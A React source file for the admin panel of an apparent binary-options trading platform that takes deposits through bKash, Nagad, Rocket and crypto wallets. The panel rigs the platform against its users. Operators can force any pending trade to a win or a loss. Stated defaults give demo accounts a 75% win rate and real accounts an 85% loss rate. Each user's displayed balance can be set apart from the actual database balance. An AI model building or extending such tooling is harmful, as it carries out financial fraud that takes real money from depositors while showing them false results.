import React, { useState, useEffect } from 'react';
import { User, Trade, Deposit, OutcomeControl } from '../types';
import {  ShieldAlert, Users, TrendingUp, CreditCard, RefreshCw, DollarSign, Settings , Activity, ShieldCheck, Wallet, BarChart3 } from 'lucide-react';

export const AdminPanel: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [trades, setTrades] = useState<Trade[]>([]);
  const [deposits, setDeposits] = useState<Deposit[]>([]);
  const [activeTab, setActiveTab] = useState<'users' | 'trades' | 'deposits' | 'gateways'>('trades');
  const [loading, setLoading] = useState<boolean>(true);
  const [editingBalanceUser, setEditingBalanceUser] = useState<string | null>(null);
  const [newDisplayedBalance, setNewDisplayedBalance] = useState<number>(0);
  const [newActualBalance, setNewActualBalance] = useState<number>(0);

  // Payment gateways admin settings
  const [bkashNumber, setBkashNumber] = useState('01711982345');
  const [bkashType, setBkashType] = useState('Cash Out');
  const [nagadNumber, setNagadNumber] = useState('01812443890');
  const [nagadType, setNagadType] = useState('Cash Out');
  const [rocketNumber, setRocketNumber] = useState('01912443891');
  const [rocketType, setRocketType] = useState('Send Money');
  const [cryptoNetworks, setCryptoNetworks] = useState([
    { network: "USDT (TRC20)", address: "TXYZ..." },
    { network: "USDT (BEP20)", address: "0xABC..." },
    { network: "LTC", address: "L..." }
  ]);
  const [savingSettings, setSavingSettings] = useState(false);
  const [settingsSuccess, setSettingsSuccess] = useState(false);

  const fetchGatewaySettings = async () => {
    try {
      const res = await fetch('/api/gateway-settings');
      if (res.ok) {
        const data = await res.json();
        if (data) {
          if (data.Bkash) {
            setBkashNumber(data.Bkash.number);
            setBkashType(data.Bkash.type);
          }
          if (data.Nagad) {
            setNagadNumber(data.Nagad.number);
            setNagadType(data.Nagad.type);
          }
          if (data.Rocket) {
            setRocketNumber(data.Rocket.number);
            setRocketType(data.Rocket.type);
          }
          if (data.Crypto) {
            setCryptoNetworks(data.Crypto);
          }
        }
      }
    } catch (err) {
      console.error('Failed to load gateway settings', err);
    }
  };

  const handleSaveGatewaySettings = async () => {
    setSavingSettings(true);
    setSettingsSuccess(false);
    try {
      const res = await fetch('/api/admin/gateway-settings', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          Bkash: { number: bkashNumber, type: bkashType },
          Nagad: { number: nagadNumber, type: nagadType },
          Rocket: { number: rocketNumber, type: rocketType },
          Crypto: cryptoNetworks
        })
      });
      if (res.ok) {
        setSettingsSuccess(true);
        setTimeout(() => setSettingsSuccess(false), 3000);
      }
    } catch (err) {
      console.error('Failed to save gateway settings', err);
    } finally {
      setSavingSettings(false);
    }
  };

  const updateCryptoNetwork = (index: number, field: 'network' | 'address', value: string) => {
    const newNetworks = [...cryptoNetworks];
    newNetworks[index][field] = value;
    setCryptoNetworks(newNetworks);
  };

  const fetchAdminData = async () => {
    setLoading(true);
    try {
      const [usersRes, tradesRes, depositsRes] = await Promise.all([
        fetch('/api/admin/users'),
        fetch('/api/admin/trades'),
        fetch('/api/admin/deposits')
      ]);

      if (usersRes.ok) setUsers(await usersRes.json());
      if (tradesRes.ok) setTrades(await tradesRes.json());
      if (depositsRes.ok) setDeposits(await depositsRes.json());
    } catch (err) {
      console.error('Failed to load admin data', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAdminData();
    fetchGatewaySettings();
    const interval = setInterval(fetchAdminData, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleUpdateBalance = async (userId: string) => {
    try {
      const res = await fetch(`/api/admin/user/${userId}/balance`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          displayed_balance: newDisplayedBalance,
          actual_balance: newActualBalance
        })
      });
      if (res.ok) {
        setEditingBalanceUser(null);
        fetchAdminData();
      }
    } catch (err) {
      console.error('Failed to update balance', err);
    }
  };

  const handleToggleBlock = async (userId: string, currentStatus: string) => {
    const newStatus = currentStatus === 'active' ? 'blocked' : 'active';
    try {
      await fetch(`/api/admin/user/${userId}/status`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: newStatus })
      });
      fetchAdminData();
    } catch (err) {
      console.error('Failed to change user status', err);
    }
  };

  const handleSetTradeControl = async (tradeId: string, outcomeControl: OutcomeControl) => {
    try {
      await fetch(`/api/admin/trade/${tradeId}/control`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ outcome_control: outcomeControl })
      });
      fetchAdminData();
    } catch (err) {
      console.error('Failed to update trade outcome control', err);
    }
  };

  const handleProcessDeposit = async (depositId: string, status: 'Approved' | 'Rejected') => {
    try {
      await fetch(`/api/admin/deposit/${depositId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status })
      });
      fetchAdminData();
    } catch (err) {
      console.error('Failed to process deposit', err);
    }
  };

  const pendingTrades = trades.filter(t => t.trade_status === 'Pending');
  const completedTrades = trades.filter(t => t.trade_status !== 'Pending');

  return (
    <div className="max-w-7xl mx-auto p-4 md:p-6 space-y-6 font-sans bg-[#060709] min-h-screen rounded-3xl mt-2">
      
      
      {/* KPI Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
        <div className="bg-[#11141d] border border-slate-800/60 rounded-2xl p-5 shadow-lg relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <Users className="w-12 h-12 text-blue-500" />
          </div>
          <div className="flex items-center gap-3 mb-2">
            <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center border border-blue-500/20">
              <Users className="w-4 h-4 text-blue-500" />
            </div>
            <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Total Traders</span>
          </div>
          <div className="text-2xl font-black text-white font-mono">{users.length}</div>
        </div>
        
        <div className="bg-[#11141d] border border-slate-800/60 rounded-2xl p-5 shadow-lg relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <Activity className="w-12 h-12 text-emerald-500" />
          </div>
          <div className="flex items-center gap-3 mb-2">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20">
              <Activity className="w-4 h-4 text-emerald-500" />
            </div>
            <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Active Trades</span>
          </div>
          <div className="text-2xl font-black text-emerald-400 font-mono">{pendingTrades.length}</div>
        </div>

        <div className="bg-[#11141d] border border-slate-800/60 rounded-2xl p-5 shadow-lg relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <Wallet className="w-12 h-12 text-purple-500" />
          </div>
          <div className="flex items-center gap-3 mb-2">
            <div className="w-8 h-8 rounded-lg bg-purple-500/10 flex items-center justify-center border border-purple-500/20">
              <Wallet className="w-4 h-4 text-purple-500" />
            </div>
            <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Pending Deposits</span>
          </div>
          <div className="text-2xl font-black text-purple-400 font-mono">{deposits.filter(d => d.status === 'Pending').length}</div>
        </div>

        <div className="bg-[#11141d] border border-slate-800/60 rounded-2xl p-5 shadow-lg relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <BarChart3 className="w-12 h-12 text-amber-500" />
          </div>
          <div className="flex items-center gap-3 mb-2">
            <div className="w-8 h-8 rounded-lg bg-amber-500/10 flex items-center justify-center border border-amber-500/20">
              <BarChart3 className="w-4 h-4 text-amber-500" />
            </div>
            <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Total Volume</span>
          </div>
          <div className="text-2xl font-black text-amber-400 font-mono">
            ${trades.reduce((acc, t) => acc + t.investment_amount, 0).toLocaleString()}
          </div>
        </div>
      </div>

      {/* Header */}
      <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 shadow-sm transition-colors">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-rose-500">
            <ShieldAlert className="w-7 h-7" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl font-extrabold text-slate-900 dark:text-white">Admin Outcome Matrix Controller</h1>
              <span className="bg-rose-500/20 text-rose-500 text-[10px] font-bold px-2 py-0.5 rounded border border-rose-500/30 uppercase">Operator Level</span>
            </div>
            <p className="text-slate-500 dark:text-slate-400 text-xs mt-1">
              Override probability matrix defaults, edit real user wallet state, and verify bKash/Nagad cashouts.
            </p>
          </div>
        </div>

        <button
          onClick={fetchAdminData}
          className="flex items-center gap-2 bg-[#171a22] dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 px-4 py-2 rounded-xl text-xs font-semibold transition-colors border border-slate-200 dark:border-slate-700"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin text-emerald-500' : ''}`} />
          Refresh Feeds
        </button>
      </div>

      {/* Navigation Tabs */}
      <div className="flex items-center gap-2 border-b border-slate-200 dark:border-slate-800/60 pb-2">
        <button
          onClick={() => setActiveTab('trades')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
            activeTab === 'trades'
              ? 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
              : 'text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <TrendingUp className="w-4 h-4" />
          Trade Outcome Overrides ({pendingTrades.length} Pending)
        </button>

        <button
          onClick={() => setActiveTab('users')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
            activeTab === 'users'
              ? 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
              : 'text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <Users className="w-4 h-4" />
          User Account Balances ({users.length})
        </button>

        <button
          onClick={() => setActiveTab('deposits')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
            activeTab === 'deposits'
              ? 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
              : 'text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <CreditCard className="w-4 h-4" />
          Deposit Verification ({deposits.filter(d => d.status === 'Pending').length} Pending)
        </button>

        <button
          onClick={() => setActiveTab('gateways')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
            activeTab === 'gateways'
              ? 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
              : 'text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <Settings className="w-4 h-4" />
          Mobile Gateways Manager
        </button>
      </div>

      {/* TAB 1: TRADES OVERRIDE */}
      {activeTab === 'trades' && (
        <div className="space-y-6">
          <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 space-y-4 shadow-sm transition-colors">
            <h2 className="text-sm font-bold text-slate-900 dark:text-white uppercase tracking-wider flex items-center justify-between">
              <span>Active Trades Matrix (Awaiting 30s Expiration)</span>
              <span className="text-[10px] font-semibold text-slate-400">Default: DEMO=75% Win, REAL=85% Loss</span>
            </h2>

            {pendingTrades.length === 0 ? (
              <div className="text-center py-12 text-slate-400 text-xs bg-slate-50 dark:bg-[#0c0d10]/50 rounded-xl border border-slate-200 dark:border-slate-800/60/50">
                No active pending trades right now. New trades will appear here instantly.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs text-slate-700 dark:text-slate-300">
                  <thead className="uppercase bg-[#171a22] dark:bg-[#0c0d10] text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800/60 font-semibold">
                    <tr>
                      <th className="p-3">Trade ID / User</th>
                      <th className="p-3">Asset / Direction</th>
                      <th className="p-3">Account Type</th>
                      <th className="p-3">Investment</th>
                      <th className="p-3">Entry Price</th>
                      <th className="p-3">Override Control</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-200 dark:divide-slate-800 font-mono">
                    {pendingTrades.map((t) => (
                      <tr key={t.id} className="hover:bg-slate-50 dark:hover:bg-[#171a22] font-sans">
                        <td className="p-3 font-mono">
                          <div className="font-bold text-slate-900 dark:text-white">{t.user_name || t.user_id}</div>
                          <div className="text-[10px] text-slate-400">{t.id}</div>
                        </td>
                        <td className="p-3">
                          <div className="font-bold">{t.asset_name}</div>
                          <span
                            className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
                              t.trade_type === 'Buy' ? 'bg-emerald-500/20 text-emerald-500' : 'bg-rose-500/20 text-rose-500'
                            }`}
                          >
                            {t.trade_type}
                          </span>
                        </td>
                        <td className="p-3 uppercase font-bold text-[10px] text-amber-500">{t.account_type}</td>
                        <td className="p-3 font-bold font-mono text-slate-900 dark:text-white">${t.investment_amount}</td>
                        <td className="p-3 font-mono">{t.entry_price}</td>
                        <td className="p-3">
                          <select
                            value={t.outcome_control}
                            onChange={(e) => handleSetTradeControl(t.id, e.target.value as OutcomeControl)}
                            className={`px-3 py-1.5 rounded-lg font-bold text-xs outline-none border transition-colors cursor-pointer ${
                              t.outcome_control === 'Force_Win'
                                ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-600 dark:text-emerald-400'
                                : t.outcome_control === 'Force_Loss'
                                ? 'bg-rose-500/20 border-rose-500/50 text-rose-500'
                                : 'bg-[#171a22] dark:bg-[#0c0d10] border-slate-300 dark:border-slate-700 text-slate-800 dark:text-slate-200'
                            }`}
                          >
                            <option value="Auto">Auto (Probability Algorithm)</option>
                            <option value="Force_Win">Force User WIN</option>
                            <option value="Force_Loss">Force User LOSS</option>
                          </select>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          {/* Historical Log */}
          <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 space-y-4 shadow-sm transition-colors">
            <h2 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider">Resolved Trade Logs</h2>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs text-slate-700 dark:text-slate-300">
                <thead className="uppercase bg-[#171a22] dark:bg-[#0c0d10] text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800/60 font-semibold">
                  <tr>
                    <th className="p-3">User</th>
                    <th className="p-3">Asset</th>
                    <th className="p-3">Account</th>
                    <th className="p-3">Entry / Exit</th>
                    <th className="p-3">Result</th>
                    <th className="p-3">Outcome Override</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-200 dark:divide-slate-800 font-mono">
                  {completedTrades.slice(0, 8).map((t) => (
                    <tr key={t.id}>
                      <td className="p-3 font-bold font-sans text-slate-900 dark:text-white">{t.user_name}</td>
                      <td className="p-3">{t.asset_name}</td>
                      <td className="p-3 uppercase text-[10px]">{t.account_type}</td>
                      <td className="p-3">{t.entry_price} → {t.exit_price || '-'}</td>
                      <td className="p-3 font-bold">
                        <span className={t.trade_status === 'Win' ? 'text-emerald-500' : 'text-rose-500'}>
                          {t.trade_status} (${t.profit ? (t.profit > 0 ? `+${t.profit}` : t.profit) : '0'})
                        </span>
                      </td>
                      <td className="p-3 font-sans text-slate-400">{t.outcome_control}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: USER BALANCE MANAGEMENT */}
      {activeTab === 'users' && (
        <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 space-y-4 shadow-sm transition-colors">
          <h2 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider">Traders List</h2>
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs text-slate-700 dark:text-slate-300">
              <thead className="uppercase bg-[#171a22] dark:bg-[#0c0d10] text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800/60 font-semibold">
                <tr>
                  <th className="p-3.5">Trader Name & Email</th>
                  <th className="p-3.5">Real DB Balance</th>
                  <th className="p-3.5">Displayed Balance</th>
                  <th className="p-3.5">Demo Balance</th>
                  <th className="p-3.5">Status</th>
                  <th className="p-3.5 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-200 dark:divide-slate-800">
                {users.map((u) => (
                  <tr key={u.id} className="hover:bg-slate-50 dark:hover:bg-[#171a22]">
                    <td className="p-3.5">
                      <div className="font-bold text-slate-900 dark:text-white">{u.name}</div>
                      <div className="text-[10px] text-slate-400 font-mono">{u.email}</div>
                    </td>
                    <td className="p-3.5 font-mono font-bold text-emerald-500">${u.actual_balance.toFixed(2)}</td>
                    <td className="p-3.5 font-mono font-bold text-slate-900 dark:text-white">${u.displayed_balance.toFixed(2)}</td>
                    <td className="p-3.5 font-mono text-amber-500 font-bold">${u.demo_balance.toFixed(2)}</td>
                    <td className="p-3.5">
                      <span
                        className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase ${
                          u.status === 'active'
                            ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/30'
                            : 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
                        }`}
                      >
                        {u.status}
                      </span>
                    </td>
                    <td className="p-3.5 text-right space-x-2">
                      <button
                        onClick={() => {
                          setEditingBalanceUser(u.id);
                          setNewDisplayedBalance(u.displayed_balance);
                          setNewActualBalance(u.actual_balance);
                        }}
                        className="bg-[#171a22] dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-900 dark:text-white px-3 py-1.5 rounded-lg text-xs font-semibold border border-slate-200 dark:border-slate-700"
                      >
                        Edit Balance
                      </button>

                      <button
                        onClick={() => handleToggleBlock(u.id, u.status)}
                        className={`px-3 py-1.5 rounded-lg text-xs font-semibold border ${
                          u.status === 'active'
                            ? 'bg-rose-500/10 hover:bg-rose-500/20 text-rose-500 border-rose-500/30'
                            : 'bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-500 border-emerald-500/30'
                        }`}
                      >
                        {u.status === 'active' ? 'Block' : 'Unblock'}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Balance Edit Modal */}
          {editingBalanceUser && (
            <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
              <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 max-w-md w-full space-y-4 shadow-2xl">
                <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                  <DollarSign className="w-5 h-5 text-emerald-500" />
                  Override User Wallet Balances
                </h3>

                <div className="space-y-3">
                  <div>
                    <label className="block text-xs text-slate-400 uppercase font-semibold mb-1">Displayed Real Balance ($)</label>
                    <input
                      type="number"
                      value={newDisplayedBalance}
                      onChange={(e) => setNewDisplayedBalance(Number(e.target.value))}
                      className="w-full bg-slate-50 dark:bg-[#0c0d10] border border-slate-200 dark:border-slate-800/60 rounded-xl p-3 text-slate-900 dark:text-white font-mono font-bold outline-none focus:border-emerald-500"
                    />
                  </div>

                  <div>
                    <label className="block text-xs text-slate-400 uppercase font-semibold mb-1">Actual DB Balance ($)</label>
                    <input
                      type="number"
                      value={newActualBalance}
                      onChange={(e) => setNewActualBalance(Number(e.target.value))}
                      className="w-full bg-slate-50 dark:bg-[#0c0d10] border border-slate-200 dark:border-slate-800/60 rounded-xl p-3 text-slate-900 dark:text-white font-mono font-bold outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>

                <div className="flex items-center justify-end gap-3 pt-2">
                  <button
                    onClick={() => setEditingBalanceUser(null)}
                    className="px-4 py-2 bg-[#171a22] dark:bg-slate-800 text-slate-700 dark:text-slate-300 rounded-xl text-xs font-semibold"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={() => handleUpdateBalance(editingBalanceUser)}
                    className="px-4 py-2 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs hover:bg-emerald-400"
                  >
                    Save Changes
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: DEPOSITS */}
      {activeTab === 'deposits' && (
        <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 space-y-4 shadow-sm transition-colors">
          <h2 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider">Deposit Verification Requests</h2>
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs text-slate-700 dark:text-slate-300">
              <thead className="uppercase bg-[#171a22] dark:bg-[#0c0d10] text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800/60 font-semibold">
                <tr>
                  <th className="p-3.5">Trader</th>
                  <th className="p-3.5">Gateway</th>
                  <th className="p-3.5">Amount</th>
                  <th className="p-3.5">TrxID / Hash</th>
                  <th className="p-3.5">Status</th>
                  <th className="p-3.5 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-200 dark:divide-slate-800 font-mono">
                {deposits.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="text-center py-8 text-slate-400 font-sans">No deposit logs recorded</td>
                  </tr>
                ) : (
                  deposits.map((d) => (
                    <tr key={d.id} className="hover:bg-slate-50 dark:hover:bg-[#171a22]">
                      <td className="p-3.5 font-sans font-bold text-slate-900 dark:text-white">{d.user_name || d.user_id}</td>
                      <td className="p-3.5 font-sans">{d.method}</td>
                      <td className="p-3.5 text-emerald-500 font-bold">${d.amount.toFixed(2)}</td>
                      <td className="p-3.5 font-mono select-all bg-[#171a22] dark:bg-[#0c0d10] px-2 py-1 rounded border border-slate-200 dark:border-slate-800/60">
                        {d.transaction_id}
                      </td>
                      <td className="p-3.5 font-sans">
                        <span
                          className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase ${
                            d.status === 'Approved'
                              ? 'bg-emerald-500/10 text-emerald-500'
                              : d.status === 'Rejected'
                              ? 'bg-rose-500/10 text-rose-500'
                              : 'bg-amber-500/10 text-amber-500'
                          }`}
                        >
                          {d.status}
                        </span>
                      </td>
                      <td className="p-3.5 text-right space-x-2 font-sans">
                        {d.status === 'Pending' ? (
                          <>
                            <button
                              onClick={() => handleProcessDeposit(d.id, 'Approved')}
                              className="bg-emerald-500 hover:bg-emerald-400 text-slate-950 px-3 py-1.5 rounded-lg text-xs font-bold transition-colors"
                            >
                              Approve
                            </button>
                            <button
                              onClick={() => handleProcessDeposit(d.id, 'Rejected')}
                              className="bg-rose-500/10 hover:bg-rose-500/20 text-rose-500 border border-rose-500/30 px-3 py-1.5 rounded-lg text-xs font-bold transition-colors"
                            >
                              Reject
                            </button>
                          </>
                        ) : (
                          <span className="text-xs text-slate-400 italic">Processed</span>
                        )}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 5: GATEWAYS MANAGER */}
      {activeTab === 'gateways' && (
        <div className="bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-2xl p-6 space-y-6 shadow-sm transition-colors">
          <div>
            <h2 className="text-sm font-bold text-slate-900 dark:text-white uppercase tracking-wider">
              Mobile Financial Gateways
            </h2>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Add or modify the numbers that users will see when they click the payment method logos during Deposit & Cash Out.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            {/* bKash card */}
            <div className="bg-slate-50 dark:bg-[#0c0d10] p-5 rounded-xl border border-slate-200 dark:border-slate-850 space-y-4">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-[#e2125b]" />
                <h3 className="text-xs font-extrabold text-slate-800 dark:text-slate-200 uppercase tracking-wider">bKash Merchant</h3>
              </div>
              <div className="space-y-3">
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Official Number</label>
                  <input
                    type="text"
                    value={bkashNumber}
                    onChange={(e) => setBkashNumber(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2.5 text-xs text-slate-900 dark:text-white font-mono outline-none"
                  />
                </div>
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Transfer Protocol</label>
                  <select
                    value={bkashType}
                    onChange={(e) => setBkashType(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2 text-xs text-slate-900 dark:text-white outline-none"
                  >
                    <option value="Cash Out">Cash Out (Agent)</option>
                    <option value="Send Money">Send Money (Personal)</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Nagad card */}
            <div className="bg-slate-50 dark:bg-[#0c0d10] p-5 rounded-xl border border-slate-200 dark:border-slate-850 space-y-4">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-[#f57c20]" />
                <h3 className="text-xs font-extrabold text-slate-800 dark:text-slate-200 uppercase tracking-wider">Nagad Merchant</h3>
              </div>
              <div className="space-y-3">
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Official Number</label>
                  <input
                    type="text"
                    value={nagadNumber}
                    onChange={(e) => setNagadNumber(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2.5 text-xs text-slate-900 dark:text-white font-mono outline-none"
                  />
                </div>
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Transfer Protocol</label>
                  <select
                    value={nagadType}
                    onChange={(e) => setNagadType(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2 text-xs text-slate-900 dark:text-white outline-none"
                  >
                    <option value="Cash Out">Cash Out (Agent)</option>
                    <option value="Send Money">Send Money (Personal)</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Rocket card */}
            <div className="bg-slate-50 dark:bg-[#0c0d10] p-5 rounded-xl border border-slate-200 dark:border-slate-850 space-y-4">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-[#8c3c96]" />
                <h3 className="text-xs font-extrabold text-slate-800 dark:text-slate-200 uppercase tracking-wider">Rocket Merchant</h3>
              </div>
              <div className="space-y-3">
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Official Number</label>
                  <input
                    type="text"
                    value={rocketNumber}
                    onChange={(e) => setRocketNumber(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2.5 text-xs text-slate-900 dark:text-white font-mono outline-none"
                  />
                </div>
                <div>
                  <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Transfer Protocol</label>
                  <select
                    value={rocketType}
                    onChange={(e) => setRocketType(e.target.value)}
                    className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2 text-xs text-slate-900 dark:text-white outline-none"
                  >
                    <option value="Cash Out">Cash Out (Agent)</option>
                    <option value="Send Money">Send Money (Personal)</option>
                  </select>
                </div>
              </div>
            </div>
          </div>

          <h3 className="text-xs font-extrabold text-slate-800 dark:text-slate-200 uppercase tracking-wider mb-4 border-t border-slate-200 dark:border-slate-800/60 pt-6">Crypto Networks</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pb-6">
            {cryptoNetworks.map((net, idx) => (
              <div key={idx} className="bg-slate-50 dark:bg-[#0c0d10] p-5 rounded-xl border border-slate-200 dark:border-slate-850 space-y-4">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-blue-500" />
                  <h3 className="text-xs font-extrabold text-slate-800 dark:text-slate-200 uppercase tracking-wider">Crypto #{idx + 1}</h3>
                </div>
                <div className="space-y-3">
                  <div>
                    <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Network Name</label>
                    <input
                      type="text"
                      value={net.network}
                      onChange={(e) => updateCryptoNetwork(idx, 'network', e.target.value)}
                      placeholder="e.g. USDT (TRC20)"
                      className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2.5 text-xs text-slate-900 dark:text-white font-mono outline-none"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] text-slate-400 uppercase font-semibold mb-1">Wallet Address</label>
                    <input
                      type="text"
                      value={net.address}
                      onChange={(e) => updateCryptoNetwork(idx, 'address', e.target.value)}
                      placeholder="e.g. 0x..."
                      className="w-full bg-[#11141d] dark:bg-[#11141d] border border-slate-200 dark:border-slate-800/60 rounded-lg p-2.5 text-xs text-slate-900 dark:text-white font-mono outline-none"
                    />
                  </div>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center justify-between pt-4 border-t border-slate-200 dark:border-slate-800/60">
            {settingsSuccess && (
              <span className="text-xs text-emerald-500 font-bold">✓ Gateway credentials updated successfully on live terminal!</span>
            )}
            {!settingsSuccess && <span />}
            <button
              onClick={handleSaveGatewaySettings}
              disabled={savingSettings}
              className="bg-[#e2125b] text-white px-6 py-2.5 rounded-xl text-xs font-extrabold transition-colors hover:bg-opacity-90 disabled:bg-slate-300"
            >
              {savingSettings ? 'Saving Settings...' : 'Save Payment Credentials'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
